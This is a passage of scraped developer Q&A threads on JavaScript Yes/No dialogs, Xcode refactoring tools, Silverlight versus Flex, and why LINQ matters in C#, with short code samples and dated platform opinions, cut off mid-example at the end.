<li>good recruiting tool, part 1: good programmers will be attracted to our enlightened developer-friendly organization.</li>
<li>good recruiting tool, part 2: we can see some people in action who we might be interested in recruiting.</li>
</ul>

<p>Here's are two standalone packages that were released via this approach:</p>

<ul>
<li><a href=""http://code.google.com/p/orapig"" rel=""nofollow"">http://code.google.com/p/orapig</a> -- pretty recent</li>
<li><a href=""http://sourceforge.net/projects/kap/"" rel=""nofollow"">http://sourceforge.net/projects/kap/</a> -- at my old company</li>
</ul>
"
"Code to ask yes/no question in javascript <p>I could only find the function <code>confirm()</code> that gives OK/Cancel buttons. Is there any way to give Yes/No buttons?</p>
 <p>No.</p>

<p>Instead you could use a in browser modal popup.</p>
 <p>Javascript offers 3 modal boxes.  Prompt, confirm and alert.  None of those satisfy your request.  </p>

<p>There are a plethora of js modal popup solutions.  Here's an example.</p>

<ul>
<li><a href=""http://www.wildbit.com/labs/modalbox/"">ModalBox</a></li>
</ul>
 <p>No, but there are JavaScript libraries that can accomplish this for you. Just as an example, <a href=""http://extjs.com/"" rel=""nofollow"">Ext JS</a> can be used to create a <a href=""http://extjs.com/deploy/dev/examples/message-box/msg-box.html"" rel=""nofollow"">message box dialog</a>.</p>
 <p>Like everyone else above says, you're stuck with OK/Cancel using <code>confirm()</code>.</p>

<p>I would like to recommend this <a href=""http://jquery.com/"" rel=""nofollow"">jQuery</a> plugin though: <a href=""http://dev.iceburg.net/jquery/jqModal/"" rel=""nofollow"">jqModal</a>. I've used it on 3 recent projects and it has worked great for each one. Specifically check out this example:</p>

<blockquote>
  <p>6). FUN! Overrides -- a. view (alert), b. view (confirm) It is now time to
  show a real-world use for jqModal --
  overriding the standard alert() and
  confirm dialogs! Note; due to the
  single threaded nature of javascript,
  the confirm() function must be passed
  a callback -- it does NOT return
  true/false.</p>
</blockquote>
 <p>I'm a fan of <a href=""https://jqueryui.com/dialog/#modal-confirmation"" rel=""nofollow"">jQuery UI Dialog</a> for this sort of thing. Here's a sample...</p>

<pre><code>&lt;script&gt;
  $(function() {
    $( ""#dialog-confirm"" ).dialog({
      resizable: false,
      height:140,
      modal: true,
      buttons: {
        ""Yes"": function() {
          $( this ).dialog( ""close"" );
          alert(""You chose Yes!"");
        },
        ""No"": function() {
          $( this ).dialog( ""close"" );
          alert(""You chose No!"");
        }
      }
    });
  });
  &lt;/script&gt;

&lt;div id=""dialog-confirm"" title=""Are you sure you want to continue?""&gt;
  &lt;p&gt;&lt;span class=""ui-icon ui-icon-alert"" style=""float:left; margin:0 7px 20px 0;""&gt;&lt;/span&gt;These items will be permanently deleted and cannot be recovered. Are you sure?&lt;/p&gt;
&lt;/div&gt;
</code></pre>
 <p>Use dialog box to display yes or no</p>

<pre><code>           &lt;div id=""dialog_box"" class=""mnk-modal-bg"" style=""display:none""&gt;
              &lt;div id=""dbg"" class=""mnk-modal-box""&gt;
                &lt;i class=""uk-icon-exclamation-triangle""  style=""color:#757575; padding-right:5px;""&gt;
                &lt;/i&gt;Confirm?
                &lt;div class=""uk-text-center"" style=""margin-top:10px;""&gt;
                    &lt;button class=""md-btn md-btn-small md-btn-primary"" id=""ok_btn""&gt;
                        &lt;i class=""uk-icon-save"" style=""padding-right:3px;""&gt;&lt;/i&gt;OK
                    &lt;/button&gt;
                    &lt;button class=""md-btn md-btn-small md-btn-danger"" id=""close_btn""&gt;
                        &lt;i class=""uk-icon-remove"" style=""padding-right:3px;""&gt;&lt;/i&gt;Cancel
                    &lt;/button&gt;
                &lt;/div&gt;
            &lt;/div&gt;
</code></pre>

<p></p>

<pre><code>&lt;script&gt;
    $(""#ok_btn"").click(function(){
        alert(""OK"");
        $(""#dialog_box"").hide();
    });
    $(""#close_btn"").click(function(){
       alert(""CANCEL"");
       $(""#dialog_box"").hide();
    });
&lt;/script&gt;
</code></pre>
"
"Any ReSharper equivalent for Xcode? <p>I'm a complete Xcode/Objective-C/Cocoa newbie but I'm learning fast and really starting to enjoy getting to grips with a new language, platform and paradigm.</p>

<p>One thing is though, having been using Visual Studio with R# for so long I've kind of been spoiled with the coding tools such as refactorings and completion etc and as far as I can tell Xcode has some fairly limited built in support for this stuff.</p>

<p>On that note, does anyone know if any add-ins or whatever are available for the Xcode environment which add coding helpers such as automatically generating implementation skeletons from a class interface definition etc? </p>

<p>I suspect there aren't but I suppose it can't help to ask.</p>
 <p>Xcode has refactoring for C and Objective-C built in.  Just select what you'd like to refactor, choose ""Refactor..."" from either the menu bar or the contextual menu, and you'll get a window including the available refactorings and a preview area.</p>

<p>Xcode doesn't currently have a public plug-in API; if there are specific types of plug-ins you'd like Apple to enable, file enhancement requests in the <a href=""http://bugreport.apple.com/"" rel=""nofollow"" title=""Bug Reporter - it's not just for bugs!"">Bug Reporter</a>.  That way Apple can count and track such requests.</p>

<p>However, there are third-party tools like <a href=""http://www.kevincallahan.org/software/accessorizer.html"" rel=""nofollow"" title=""Accessorizer"">Accessorizer</a> and <a href=""http://rentzsch.com/code/mogenerator"" rel=""nofollow"" title=""mogenerator: Core Data codegen""><code>mogenerator</code></a> (the latest release is <a href=""http://rentzsch.com/code/mogenerator_v1.10"" rel=""nofollow"" title=""mogenerator 1.10""><code>mogenerator 1.10</code></a>) that you can use to make various development tasks faster.  Accessorizer helps you create accessor methods for your classes, while <code>mogenerator</code> does more advanced code generation for Core Data managed object classes that are modeled using Xcode's modeling tools.</p>
 <p>You sound as if you're looking for three major things: code templates, refactoring tools, and auto-completion.</p>

<p>The good news is that Xcode 3 and later come with superb auto-completion and template support.  By default, you have to explicitly request completion by hitting the escape key.  (This actually works in all <code>NSTextView</code>s; try it!)  If you want to have the completions appear automatically, you can go to <strong>Preferences</strong> -> <strong>Code Sense</strong> and set the pop-up to appear automatically after a few seconds.  You should find good completions for C and Objective-C code, and pretty good completions for C++.</p>

<p>Xcode also has a solid template/skeleton system that you can use.  You can see what templates are available by default by going to Edit -> Insert Text Macro.  Of course, you don't want to insert text macros with the mouse; that defeats the point.  Instead, you have two options:</p>

<ol>
<li>Back in <strong>Preferences</strong>,go to <strong>Key Bindings</strong>, and then, under <strong>Menu Key Bindings</strong>, assign a specific shortcut to macros you use often.  I personally don't bother doing this, but I know plenty of great Mac devs who do</li>
<li><p>Use the <code>CompletionPrefix</code>.  By default, nearly all of the templates have a special prefix that, if you type and then hit the escape key, will result in the template being inserted.  You can use Control-/ to move between the completion fields.</p>

<p>You can see <a href=""http://crookedspin.com/2005/06/10/xcode-macros/"">a full list of Xcode's default macros and their associated <code>CompletionPrefix</code>es</a> at <a href=""http://crookedspin.com"">Crooked Spin</a>.</p>

<p>You can also add your own macros, or modify the defaults.  To do so, edit the file <code>/Developer/Library/Xcode/Specifications/{C,HTML}.xctxtmacro</code>.  The syntax should be self-explanatory, if not terribly friendly.</p></li>
</ol>

<p>Unfortunately, if you're addicted to R#, you will be disappointed by your refactoring options.  Basic refactoring is provided within Xcode through the context menu or by hitting Shift-Apple-J.  From there, you can extract and rename methods, promote and demote them through the class hierarchy, and a few other common operations.  Unfortunately, neither Xcode nor any third-party utilities offer anything approaching Resharper, so on that front, you're currently out of luck.  Thankfully, Apple has already demonstrated versions of Xcode in the works that have vastly improved refactoring capabilities, so hopefully you won't have to wait too long before the situation starts to improve.</p>
 <p>Just so people know, <a href=""http://www.kevincallahan.org/software/accessorizer.html"" rel=""nofollow"">Accessorizer</a> does more than just generate accessors (both 1.0 and properties for 2.0) it also generates Core Data code for persisting non-standard attributes, your NSSet accessors for custom to-many relationships.</p>

<p>In fact, <a href=""http://www.kevincallahan.org/software/accessorizer.html"" rel=""nofollow"">Accessorizer</a> will help provide you with the init, keypath, keyed-archiving, indexed accessors, accessors for unordered collections such as NSSet, copyWithZone, KVO, key-validation, singleton overrides, dealloc, setNilForKey, non-standard attribute persistence (Core Data), locking, headerdoc, convert method to selector, NSUndoManager methods and more.</p>
 <p>I found some xtmacro files in Xcode.app package:
<strong>/Developer/Applications/Xcode.app/Contents/PlugIns/TextMacros.xctxtmacro/Contents/Resources</strong></p>

<p>Installed Xcode ver. 3.2.5.</p>
 <p>I'm excited to say that JetBrains have decided to make a decent IDE for Objective-C coders. </p>

<p>It's called <strong>AppCode</strong> and it's based on their other tools like RubyMine and Resharper. It's not native Cocoa, but has loads of raw refactoring power.</p>

<p><a href=""http://www.jetbrains.com/objc/index.html"">http://www.jetbrains.com/objc/index.html</a></p>

<p>I've started using it for my main Objective C project and I'm already in love. It's still in it's infancy, but for code editing and refactoring it already blows Xcode away.</p>

<p><strong>Update</strong></p>

<p>It's now at a totally usable speed. I've switched over to it full time and it still blows my mind how amazing refactoring and coding is compared with Xcode. It just handles so much for you - auto importing, almost infinite customisation. It makes Xcode look like a toy.</p>
"
"Silverlight vs Flex <p>My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.</p>

<p>Most of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.</p>

<p>I've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. </p>

<p>So here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious ""not everyone has Silverlight"", what are the pros and cons for each?</p>
 <p>The problem with Silverlight, is that there's still a lot of people who don't have it installed.  Also, I""m not sure how well your existing .Net developers will be able to leverage their existing skills if they are only familiar with more traditional server-side .Net coding. </p>

<p>What are your reasons for pushing Silverlight over Flex? If you have to ask the SOFlow community for reasons, it seems odd that you would be so willing to push it.</p>
 <p>I think Silverlight and XAML is preferable to ActionScript, and though I'm not familiar with ActionScript IDE's, I am familiar with VS2008 and Expression Web/Blend, and they are very good development environments and getting better all the time.  I would go with Silverlight, and I think the key to getting users to install the plug-in is to have a good plug-in detect page that explains what SL is and why they need it.  For an example of this, go to <a href=""http://memorabilia.hardrock.com/"" rel=""nofollow"">http://memorabilia.hardrock.com/</a> and try it with your SL plug-in disabled.</p>
 <p>As Kibbee hinted at above, the argument of leveraging existing .Net developers doesn't hold much water.  It is impossible to be an expert in all facets of .Net development.  The platform is just too big.  The same goes for Java.  The only thing Silverlight has going for it from a skills perspective is that you can code in your favorite .Net language.  That advantage is fairly small if you are already doing any significant web development that utilizes JavaScript since Action script is a variation.  So really to convert a programmer to either Flex or Silverlight is all about learning the platform's API.    </p>
 <p>I think Silverlight is most advantageous for companies that have .NET developers but noone with designer experience.</p>

<p>Skill sets will be easier to find as far as finding C# or VB developers vs finding ActionScript guru's.  However there is the trade off:</p>

<p>Design experience is an investment not only in Designers with artistic skill, but also in the knowledge and tools provided by Adobe.  You can nearly guarantee that a professional designer uses a mac and has experience with Adobe tools.</p>

<p>Right now the Silverlight designer tools are half baked and can be a headache.  For instance Blend errors when trying to render any xaml containing an IValueConverter, this is problematic.  I have no idea what the Adobe developer experience is, I'm sure it is as hairy.</p>

<p>So at this stage of the game it comes down to human resources:  </p>

<p>If you have .NET experience and little invested in Design skills go Silverlight. Programming skills/tools will be transferable.
If you have Design experience and skill set go with Flex.  Designer skills/tools will be transferable.</p>

<p>Either way both client platforms require communication with services to get data, so you will always leverage your existing programing expertise on the back end. </p>

<p>Paraphrased <a href=""http://stackoverflow.com/users/5/jon-galloway"" rel=""nofollow"">Jon's</a> opinion from a different point of view:</p>

<p>I think you should look at Flex as a long-term play, just as Adobe seems to be doing. There's an obvious balance on when to use Silverlight vs. Flex when you're concerned about reach and install base, but here are more reasons Flex is a good direction to move in:</p>

<ol>
<li><p>Second mover advantage - Just as
Adobe built a ""better Java Applet""
with Flash, they're able to look at
how you'd design a runtime from
scratch, today. They have the
advantage of knowing how people use
the web today, something the
inventors of existing client
platforms could never have
accurately guessed. .NET can add
features, but they can't
realistically chuck the platform and
start over.</p></li>
<li><p>Designer familiarity - While
Flex/AIR is a new programing model,
it's not entirely unfamiliar to
designers. They'll ""get"" the way
Flex works a lot more quickly than
they'll understand firing up a new
design environment with new feature
poor tools and new animation
paradigms.</p></li>
<li><p>Being rid of the RGB color model in
Silverlight- .NET was originally
built for windows and it is at the
core of how it works. Flex ditched a
long time ago for an design-centric
model.</p></li>
<li><p>All your tools run on your mac. Nuff
said.</p></li>
<li><p>Cool features - Silverlight still
has some catching up to do with
Flash on some obvious features (like
webcam / mic integration, or 3d /
graphics acceleration).</p></li>
</ol>
 <p>I think you should look at Silverlight as a long-term play, just as Microsoft seems to be doing. There's an obvious balance on when to use Silverlight vs. Flash when you're concerned about reach and install base, but here are some reasons Silverlight is a good direction to move in:</p>

<ol>
<li><p>Second mover advantage - Just as Microsoft built a ""better Java"" with .NET, they're able to look at how you'd design a RIA plugin from scratch, today. They have the advantage of knowing how people use the web today, something the inventors of Flash could never have accurately guessed. Flash can add features, but they can't realistically chuck the platform and start over.</p></li>
<li><p>Developer familiarity - While Silverlight is a new model, it's not entirely unfamiliar to developers. They'll ""get"" the way Silverlight works a lot more quickly than they'll understand firing up a new development environment with a new scripting language and new event paradigms.</p></li>
<li><p>Being rid of the timeline model in Flash - Flash was originally built for keyframe based animations, and while there are ways to abstract this away, it's at the core of how Flash works. Silverlight ditches that for an application-centric model. </p></li>
<li><p>ScottGu - ScottGu is fired up about Silverlight. Nuff said.</p></li>
<li><p>Cool new features - While Silverlight still has some catching up to do with Flash on some obvious features (like webcam / mic integration, or 3d / graphics acceleration), there are some slick new technologies built in to Silverlight - Deep Zoom is one example. I'm seeing more ""revolutionary"" technologies on the Silverlight side, while Flash seems to be in maintenance mode at this point.</p></li>
</ol>
 <p>There's two questions here: Silverlight vs. Flash as platform and Silverlight vs. Flex as RIA framework.</p>

<p>The first question depends on your timeframe. Flash Player has over 95% reach, Silverlight has no way near that. However, Silverlight may get there, it is after all backed by Microsoft. If you aim to launch a site next week and want a huge audience, Silverlight is not an option. If you aim to launch a really cool application that everyone would want to use it's a bit different, if your app is good enough your target audience may install Silverlight just to be able to run it.</p>

<p>As for the second question its a matter of how easy it is to develop <em>applications</em> in Silverlight. Flex isn't just a set of widgets, it's a very big framework that does a lot of thing that ease the work of the developer. You could write the same applications using only the core Flash API, but it would be very much more work. Depending on what's available in Silverlight, this should be an important factor when deciding. If you can cut development time, is having two platforms worth it?</p>
 <p>Silverlight programmer's don't know what they're missing out on, when it comes to Flex.  Silverlight lacks the component model and event triggering capabilites that Flex has.  Using XNA, and C#, a friend of mine has to jump through all kinds of hoops to get his Silverlight application to work.  Then, it has to be handed off to a designer to get it to look half way decent.  </p>

<p>Listen to the deepfriedbytes.com podcasts on Silverlight, and you'll hear how even a couple guys that really push Silverlight, acknowledge some of these issues.  (I <em>think</em>, if I recall correctly, one of the guys works for Microsoft, but I could be wrong - I listened to it last week).  They agree that Silverlight isn't quite ready for any huge applications, in its current state.</p>

<p>I would go with Flex, for a nice clean, straightforward approach - especially if you're already familiar with Flash and ActionScript 3.0.  Flex makes alot more sense, in my opinion - Silverlight still has to mature.</p>
 <p>Another advantage of Flex development is that you can switch to developing desktop applications (Adobe AIR) with the same source code (and same IDE) and distribute them from web. You can check out <a href=""http://labs.adobe.com"" rel=""nofollow"">this</a>
 for the future of Flash platform.
<br>
Update Q3/2011: Flash 11 supports low-level 3D acceleration, and there are already many frameworks and major engines (Unreal Engine 3, Unity) supporting it. The selling point for the future, however, is that AIR application will work on Windows, Mac, Android, Playbook, and iOS platforms (Linux support has been dropped). With an absolute minimum of hassle between porting between those (at least when you have Adobe CS5.5+).</p>

<p>Update Q2/2015: Silverlight is officially dead. Adobe AIR is alive, but not thriving - it might be useful based on your skills and tool chain. Both Microsoft and Adobe admit that HTML5 is the way to go (whether with AIR or Apache Cordova or Visual Studio).</p>
 <p>Asa graphics designer, I've used Flash (on and off) over the last few years, and Silverlight (and its big brother WPF) over the last 1.5 years. Based on what I've heard from my team (all of whom are developers or former developers, if your .Net developers will be doing all the programming, go with Silverlight. I love Flash, but even with the OOP overhaul to ActionScript 3 in Flash 9 and up, it's still a somewhat quirky language, and going back and forth between AS3 and C# will probably drive your developers nuts :-).</p>

<p>For your designers, do the following:</p>

<ul>
<li><p>Get them a copy of Expression Blend, the GUI development tool for Silverlight/WPF. </p></li>
<li><p>Blend has a somewhat steep initial learning curve, and the interface throws a ton of variables/options at you, so invest in some training, and give your designers time to get up to speed with the UI.</p></li>
<li><p>Speaking of training, get a subscription to the Lynda.com video library, esp. the Lee Brimelow Expression Blend training course.</p></li>
<li><p>Caveat emptor: Blend and WPF change rapidly, so sometimes you'll run into bugs in Blend that are fixed in the next beta/CTP of Blend. E.g. There was a bug in Blend 2 that prevent my storyboards (animations) from working in a recent project. I upgraded to Blend 2.5CTP, and it worked.</p></li>
<li><p>Silverlight content doesn't always seem to work with the latest Beta of the Silverlight plugin, just something to keep in mind if you're testing some new feature that's only available in the latest Silverlight plugin.</p></li>
<li><p>Invest in a powerful system (Quad Core, 4Gigs of RAM, etc.) Blend consumes a lot of resources, esp. when you have tons of layers. E.g. I'm working on an app with over a 100 layers(!) in the base app (and another 100+ in some of the user controls), and about 40-50 storyboards. Every few minutes, I have to restart Blend, because the UI stops responding (but doesn't freeze). Either that, or move everything you can into user controls.</p></li>
</ul>
 <p>Not to forget: </p>

<p>Flex is very much cross platform, as it is compiled using as Java compile which means that you can easily use Mac or Linux when developing Flex applications. I've my current cruisecontrol setup (which uses Linux) I build build Flex applications, but the development guys uses both Mac, Linux and Windows. </p>

<p>In my experience, java developers feels quite at home in Flex Builder since it is based on Eclipse.</p>
 <p>You will never get an fair vote to this question on SO as it has so many Microsoft devs. </p>

<p>Also, people will probably down vote this answer, which says it all really.</p>

<p>I say let your developers try both platforms, and see which they prefer.</p>

<p>To answer the comments below, I just noticed that while there are lots of answers recommending Flash / Flex, the ones for Silverlight have many more up votes. It's not a matter of lying, it's just favouring what you're familiar with, not necessarily the best platform.</p>
 <p>We went through this same issue and Flex won hands down. Our .NET developers were concerned at first, but after working so long in the pain of Ajax and JavaScript, they now LOVE and really enjoy working in Flex.</p>

<p>Here's a simple test for you . . . try to find at least 3 examples of real-world Silverlight applications (that aren't games, video players or gadgets). Then do the same for Flex.</p>
 <p>I use this rule of thumb: if your company is developing internet based multimedia software, and has customers with all sorts of platforms, and you are not doing database intensive applications Flex is the definite answer, if your company develops both internet and DVD based products, less interactive but more intensive (CPU, Memory) and uses ridiculous amount of database transaction Silverlight makes more sense </p>
 <p>Someone said: ""Find 3 real world silverlight applications"". Ok, I knew some off the top of my head but I googled it anyway. The list: </p>

<ul>
<li>2008 Beijing Olympics (<a href=""http://blogs.technet.com/james/archive/2008/08/14/crazy-olympic-silverlight-stats.aspx"" rel=""nofollow"">stats here</a>, 250TB of data delivered!)</li>
<li>Netflix on-demand player</li>
<li>AOL email client (may not be released yet) </li>
</ul>

<p>Oh, not video players? Well that leaves the UFC application (it's a hybrid video/chat/other stuff) and the AOL email client. Silverlight excels at video and that's where it's gaining it's foothold but that doesn't mean it can't do other things. I see no reason to dismiss it just because it does video well. </p>

<p>Infoworld <a href=""http://www.infoworld.com/article/08/11/18/47TC-silverlight-2_2.html"" rel=""nofollow"">[link]</a> said that ""Silverlight has substantial technical merit and relatively good performance. It's a very capable RIA technology that's especially useful in the hands of programmers with .Net experience and designers with XAML experience."" It's a good article for you to read regarding your question. </p>

<p>My answer: if you have a team of devs that are comfortable with .NET then Silverlight should be first on your list. If not, then it's a real tossup. I've seen articles say that Visual Studio is a superior development platform compared to what you use with Flex. But Flash is damn near ubiquitous. </p>

<p>Also keep in mind that Silverlight 2 uses almost no Javascript (I think none, but I'm not positive). So any avoidance of Silverlight because of JS is unfounded. </p>

<p>If <strong>performance</strong> matters, Silverlight wins there. I've seen my browser's CPU usage go to 100% many times and killing whatever window is running Flash always got rid of it. It's especially obvious in Chrome where you can see the process that's consuming your CPU. If your interested in Silverlight for gaming potential, look for QuakeLight, the Silverlight port of Quake. It's shaping up really well. </p>

<p>I really think it comes down to where your developer talent lies and what kind of application you'll be delivering. Simple game? Flash. Line of business app? Silverlight. In-between? Go with what your devs recommend. </p>
 <p>At the end of the day, your developers should not be dictating your technology. This is absolutely a product decision that should be based on your users. </p>

<p>If you are deploying to the consumer Internet, the Flash Player or AJAX is the way to go. If you're deploying to a private LAN for a .net enterprise, you have options. </p>
 <p>You seriously shouldn't use <em>ANY</em> of these ActiveX2.0 technologies. Neither Silverlight nor Flex...</p>

<p>First of all, both of them are nothing more then ""distributed winforms frameworks with support for being ran in the browser"", second of all they don't port well to other devices (specially true for Silverlight), thirdly they don't work good with other portions of your page. They don't work well for disabled people, etc, etc, etc. List goes on into infinity...</p>

<p>Adobe and Microsoft both tries to hide this fact really hard, but at the end of the day both Silverlight and Flex is nothing but ActiveX in a new wrapping...</p>

<p>Sure they run in sandboxes, are managed languages and all that. But it's still a big piece of BLOB being downloaded to run locally in your browser, AKA ActiveX...</p>
 <p>Although I have done work with Silverlight and am pretty excited about the ability to have apps living outside of the browser, one huge benefit of AIR is that is provides access to native drag and drop functionality. This allows you to build very user-friendly image or document uploads features (e.g. Flickr uploader). From what I heard, MS is not focusing on that kind of support yet (i.e. no plans announced).</p>
 <p>If you know .NET, Silverlight 3.0 is the way to go. I'm using it and I love it. I don't have to mess with AJAX or JS BTW (I have no idea what that guy was refering to, maybe SL 1.0) For data it's mostly async WCF calls (LINQ to SQL behind WCF) or XML files or RIA Services. It let's you use most shader FX, it has styles, control templates and the native access windows/mac clipboard. I can run high def video and most processes run very well even under slow CPUs. I also enjoy the data binding, control binding and the observable collections save me a lot of time. PLUS i can use LINQ, major time saver, not to mention using Visual Studio to debug with.</p>

<p>I'm developing enterprise .NET applications, so I know my install base and they will install the add-in (30 seconds usually). For a front end website, you may lose some users who don't want to install silverlight or don't run Mac or Windows. You CAN have apps with SL outside of the browser with 3.0.</p>

<p>I may be a biased .NET guy but I've been developing so quickly I have to recommend it.</p>
 <p>My team used to write rich web features in Flex, and now writes them in Silverlight.</p>

<p>Our reasons for this switch:</p>

<ul>
<li>FlexBuilder is built on Eclipse. Eclipse is awful! Free, but bug ridden, glitch filled and slow.</li>
<li>FlexBuilder is twice the price of Expression Blend, which we get for free with MSDN anyway.</li>
<li>Flex is a pain to source control, it doesn't like being made to put files in one place and it doesn't play nice with other parts of your solution (we tried with SourceGear Vault and SVN).</li>
<li>Flex's version of ActionScript doesn't like most SOAP implementations, in particular it has all sorts of problems with .Net WebMethod ones.</li>
<li>Despite us using licensed Flex components periodically it decides that we don't have that version and adds demo-only watermarks in. The only way to remove this is to take the project to bits, reinstall Flex, reinstall the licenses and rebuild it.</li>
<li>FlexBuilder does not like Vista at all.</li>
<li>Silverlight acceptance is growing, once it was at the level where we could add it as a requirement for the relevant features we switched. If we were working for a web (rather than corporate) audience I'm not sure that we could have.</li>
</ul>

<p>The rest of our project is .Net and C#, you may find all these issues less significant in a Java shop.</p>
 <p>We are doing both silverlight and flex, and here are developer's point of view for both.</p>

<p>Pros of Silverlight:</p>

<ol>
<li>Power of C#, Code Snippets, Reusing existing C# Algorithm Implementations</li>
<li>Power of other languages too, Generics and Linq etc</li>
<li>Power of Native execution of CLR instead of Flash's Action Script Interpretator</li>
<li>One Integrated Visual Studio for All Development</li>
<li>Expression Blend is really cool and more advanced editor then Flex Builder</li>
<li>XAML is Search Engine Friendly</li>
<li>Pretty nice state transitions and easy to define them</li>
<li>Threading and Asynchronous Tasks</li>
<li>Accessibility, no one knows that Microsoft always made the best accessiility features on all of its products, they always worked well with disabled people, comparing the browsers only IE supports full accessibility and Safari/firefox etc are no where closer.</li>
</ol>

<p>Cons of Silverlight:</p>

<ol>
<li>Strictly Microsoft Platform, I know lot of people will argue but with current scenario, half of Intel Mac guys cant get silverlight 3.0 working, all PPC Mac guys cant use Silverlight 2.0 onwards, and No silverlight for Linux.</li>
<li>There is mono, but not officially supported by Microsoft, it will always lag behind reverse engineering .NET and porting it on other platform, its not out of the box yet.</li>
<li>Majority of components/controls are ""Sealed"" so its difficult to extend them and override to make new components easily.</li>
<li>Bad CustomControl/UserControl architecture. E.g. you cant have XAML's root as ComboBox or any other control and let it have both design as well as code, you can create custom control but they are way too complex</li>
<li>Binding requires component naming and does not support instance expressions like flex does, though two way binding is good in silverlight but you have to write long codes for multiple bindings for one math expression</li>
</ol>

<blockquote>
<pre><code>e.g.
// this is possible in flex..
// but not in silverlight
&lt;mx:TextBox id=""firstName""/&gt;
&lt;mx:TextBox id=""lastName""/&gt;

// display full name..
&lt;mx:Label text=""{firstName.text} {lastName.text}""/&gt;
</code></pre>
</blockquote>

<p>Pros of Flex:</p>

<ol>
<li>Truely platform independent, supported on various hardware and operating systems and truely working everywhere great.</li>
<li>Open Source makes it really easy to understand and extend the functionality.</li>
<li>Every control/component can be extended and there are less restrictions overriding default behaviour.</li>
<li>The most easy way to create new components, you can have mxml derive from any control and extend them with extensive binding</li>
<li>Flex contains lots of controls and you dont need any third party library</li>
</ol>

<p>Cons of Flex:</p>

<ol>
<li>Slow execution for iterative executions, no threads !! no async tasks !!</li>
<li>Based on point 1, no great animation or graphics possible</li>
<li>No generics, No other languages, No linq.. </li>
<li>Number class has a bug, cant store full 64 bit long value</li>
<li>Eclipse is bad to design something great UI</li>
</ol>

<p>Conclusion</p>

<ol>
<li>We use flex for data applications, those are simple form processing applications</li>
<li>Silverlight for extremely rich graphics and animation</li>
</ol>
 <p>Flash Player is available &amp; supported officially in almost all desktop platforms (Windows, Linux, Mac) whereas Silverlight will be supported mainly in Windows.</p>

<p>the following <a href=""http://www.brighthub.com/internet/web-development/articles/33696.aspx"" rel=""nofollow"">article</a> provides comparision of both the platforms.</p>
 <p>This is an old question, <strong>history has now spoken!</strong></p>

<p>Silverlight has been as good as abandoned by Microsoft, it never got a useful install base.    Party due to Microsoft not committing 100% to it.</p>

<p>Flash (hence Flex) is still going.   However more and more browsers don’t support any plug-ins, <strong>so it is only a matter of time (years) before flush goes the way of Silverlight</strong>.</p>

<p>Maybe one day Flex will be re-targeted to HTML5 with no plug-ins….</p>

<p><strong>The iPhone was spoken, and it said the only option is Apples Way or HTML5.</strong></p>
"
"Am I missing something about LINQ? <p>I seem to be missing something about LINQ.  To me, it looks like it's taking some of the elements of SQL that I like the least and moving them into the C# language and using them for other things.</p>

<p>I mean, I could see the benefit of using SQL-like statements on things other than databases.  But if I wanted to write SQL, well, why not just write SQL and keep it out of C#?  What am I missing here?</p>
 <p>The point is that LINQ integrates your queries into your primary programming language, allowing your IDE to provide you with some facilities (Intellisense and debug support, for example) that you otherwise would not have, and to allow the compiler to type-check your SQL code (which is impossible with a normal string query).</p>
 <p>LINQ is not about SQL. LINQ is about being apply functional programming paradigmns on objects.</p>

<p>LINQ to SQL is an ORM built ontop of the LINQ foundation, but LINQ is much more. I don't use LINQ to SQL, yet I use LINQ all the time.</p>

<p>Take the task of finding the intersection of two lists:</p>

<p>Before LINQ, this tasks requires writing a nested foreach that iterates the small list once for every item in the big list O(N*M), and takes about 10 lines of code.</p>

<pre><code>foreach (int number in list1)
{
    foreach (int number2 in list2)
    {
        if (number2 == number)
        {
            returnList.add(number2);
        }
    }
}
</code></pre>

<p>Using LINQ, it does the same thing in one line of code:</p>

<pre><code>var results = list1.Intersect(list2);
</code></pre>

<p>You'll notice that doesn't look like LINQ, yet it is. You don't need to use the expression syntax if you don't want to.</p>
 <p>So the really, really big deal about LINQ has nothing to do with Linq to SQL. It's about the enhancements it brought to the C# language itself.</p>
 <p>LINQ is not just an ORM system, as Jonathan pointed out it brings a lot of functional programming elements to C#. And it lets you do a lot of ""database-y"" things in regular C# code. It's difficult to explain just how incredibly powerful that can be. Consider how much having solid, well designed generic data structures (such as list, stack, dictionary/hash, etc.) included in common frameworks has improved the state of development in modern languages. Precisely because using these data structures is very common and reducing the intellectual overhead of using them is a huge benefit. LINQ doesn't do anything you can't do yourself, but it makes a lot of operations a lot more straightforward and a lot easier.</p>

<p>Consider the time-honored example of removing duplicates from a non-ordered list. In a lower level language like C or C++ you'd probably have to sort the list and maintain two indices into the list as you removed dupes. In a language with hashes (Java, C#, Javascript, Perl, etc.) you could create a hash where the keys are the unique values, then extract the keys into a new list. With LINQ you could just do this:</p>

<pre><code>int[] data = { 0, 1, 3, 3, 7, 8, 0, 9, 2, 1 };

var uniqueData = data.GroupBy(i =&gt; i).Select(g =&gt; g.Key);
</code></pre>
 <p>Before:</p>

<pre><code>// Init Movie
m_ImageArray = new Image[K_NB_IMAGE];

Stream l_ImageStream = null;
Bitmap l_Bitmap = null;

// get a reference to the current assembly
Assembly l_Assembly = Assembly.GetExecutingAssembly();

// get a list of resource names from the manifest
string[] l_ResourceName = l_Assembly.GetManifestResourceNames();

foreach (string l_Str in l_ResourceName)
{
    if (l_Str.EndsWith("".png""))
    {
        // attach to stream to the resource in the manifest
        l_ImageStream = l_Assembly.GetManifestResourceStream(l_Str);
        if (!(null == l_ImageStream))
        {
            // create a new bitmap from this stream and 
            // add it to the arraylist
            l_Bitmap = Bitmap.FromStream(l_ImageStream) as Bitmap;
            if (!(null == l_Bitmap))
            {
                int l_Index = Convert.ToInt32(l_Str.Substring(l_Str.Length - 6, 2));
                l_Index -= 1;
                if (l_Index &lt; 0) l_Index = 0;
                if (l_Index &gt; K_NB_IMAGE) l_Index = K_NB_IMAGE;
                m_ImageArray[l_Index] = l_Bitmap;
            }
            l_Bitmap = null;
            l_ImageStream.Close();
            l_ImageStream = null;
        } // if
    } // if
} // foreach
</code></pre>

<p>After:</p>

<pre><code>Assembly l_Assembly = Assembly.GetExecutingAssembly();

//Linq is the tops
